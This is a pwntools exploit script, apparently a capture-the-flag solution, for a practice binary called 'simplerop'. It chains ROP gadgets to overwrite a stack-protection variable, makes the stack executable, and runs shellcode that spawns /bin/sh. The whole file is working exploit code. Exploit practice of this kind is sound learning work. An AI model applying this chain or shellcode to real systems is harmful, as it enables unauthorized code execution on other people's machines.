#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./simplerop')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

eip_offset = 0x20

# gadgets
mov_at_eax_edx = 0x0000000807b301
mov_eax_edx = 0x08065878
pop_edx = 0x0806e82a
stack_prot_addr = 0x080e9fec
call_esp = 0x080deef3
pop_eax = 0x080bae06
push_esp = 0x080dfee9
pop_esp = 0x080badb6
inc_esp = 0x080a5325

# shellcode to execve /bin/sh
assembly = f"""
sub esp, 0x30
mov eax, 0xb
lea ebx, [esp-0x10]
xor ecx, ecx
xor edx, edx
int 0x80
"""
shellcode = asm(assembly)
info("shellcode length = %x", len(shellcode))

io = start()

payload = flat(
    p32(int(b'nib/'.hex(), base=16)),
    p32(int(b'\x00hs/'.hex(), base=16)),
    b'a'*(eip_offset-8),

    # we have an arbitrary 4 byte write primitive
    pop_eax,
    stack_prot_addr, # address to write to
    pop_edx,
    p32(7),
    mov_at_eax_edx, # overwrite stack_prot variable

    # make stack executable
    pop_eax,
    p32(0x080e9fc4), # __libc_stack_end
    exe.symbols._dl_make_stack_executable,
    call_esp,
    shellcode,
)

io.sendlineafter(':', payload)
io.interactive()

